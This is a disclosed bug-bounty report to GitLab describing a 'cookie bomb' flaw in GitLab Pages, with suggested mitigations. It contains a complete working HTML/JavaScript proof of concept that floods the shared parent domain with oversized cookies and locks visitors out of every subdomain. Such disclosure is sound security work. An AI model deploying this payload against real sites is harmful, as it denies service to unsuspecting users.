# Cookie bomb

## Report Details
- **Report ID**: 221041
- **URL**: https://hackerone.com/reports/221041
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-04-14T18:21:19.323Z
- **Disclosed**: 2018-02-16T22:25:29.045Z

## Reporter
- **Username**: moritz30
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
It is possible to create a that called cookie bomb in Gitlab Pages. This is especially a problem if the site creating the cookie bomb uses a shared pages domain. In that case no (sub)domain of that domain would be accessible for that user anymore until they clear their cookies. That does not only include GitLab (Pages) (sub)domains. The code of my sample page is

`<html>
<head>
</head>
<body>
<script>
var base_domain = document.domain.substr(document.domain.indexOf('.'));
var pollution = Array(4000).join('a');
for(var i=1;i<99;i++){
    document.cookie='bomb'+i+'='+pollution+';Domain='+base_domain;
}
</script>
<h1>Cookie Bomb executed! To remove it clear your cookies.</h1>
</body>
</html>`

The cookie bomb works by using JavaScript to set cookies that are way too big making the server decline any request send with them for having a too long request header.

It should also work on Gitlab.com.

More information about cookie bombs can be found at http://homakov.blogspot.de/2014/01/cookie-bomb-or-lets-break-internet.html .

A solution would be to inject JS into every page served using Gitlab pages that uses the cookies.change event and checks if there are a lot of cookies being set and then removing them. An other solution would be to check the HTML of Gitlab pages before deploying them.

Test sites:
Just a demo page that does nothing special (to see that it works before but not after executing the cookie bomb): http://test1.thedragonteam.info
A page that executes a cookie bomb: http://test2.thedragonteam.info
Both are served using Gitlab pages.

## Attachments
No attachments
